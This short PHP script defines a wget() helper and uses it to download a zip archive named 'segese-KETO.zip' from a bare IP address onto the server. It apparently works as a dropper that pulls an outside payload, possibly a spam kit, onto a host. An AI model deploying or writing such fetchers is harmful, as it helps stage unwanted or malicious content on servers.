<?php
function wget($address,$filename)
{
  file_put_contents($filename,file_get_contents($address));
}
wget('http://45.76.162.167/segese-KETO.zip', 'segese-KETO.zip');

?>
